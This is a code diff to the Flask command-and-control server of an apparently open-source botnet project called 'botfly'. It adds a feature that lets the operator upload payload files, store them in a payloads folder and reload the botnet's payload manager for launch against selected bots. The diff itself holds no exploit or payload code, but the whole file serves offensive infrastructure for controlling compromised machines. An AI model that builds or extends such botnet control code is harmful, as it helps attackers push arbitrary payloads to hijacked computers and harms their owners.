@@ -1,3 +1,5 @@
+from werkzeug.utils import secure_filename
+
 from server.botnetclasses import BotNet
 from server.botnetserver import BotServer
 from server.serverclasses import UserManager, User
@@ -26,7 +28,8 @@ eventlet.monkey_patch()
  To run: python server.py'''
 
 HOSTNAME = 'botfly'
-UPLOAD_FOLDER = 'static/uploads/'
+BASEDIR = os.path.abspath(os.path.dirname(__file__))
+UPLOAD_FOLDER = 'payloads/'
 DOWNLOAD_FOLDER = 'media/downloads/'
 
 # Set this variable to "threading", "eventlet" or "gevent" to test the
@@ -295,8 +298,16 @@ def payload_launch():
             else:
                 return "No bot selected", 404
             return "done"
+        elif 'file' in request.files:
+            f = request.files['file']
+            filename = secure_filename(f.filename)
+            location = os.path.join(BASEDIR, app.config['UPLOAD_FOLDER'], filename)
+            f.save(location)
+            botnet.payloadmanager.loadPayloads()
+            return json.dumps({"success": True})
         else:
             return "No payload specified", 404
+
     elif request.method == 'GET':
         payloadstr = json.dumps(botnet.getPayloads())
         return flask.Response(payloadstr, status=200, mimetype='application/json')
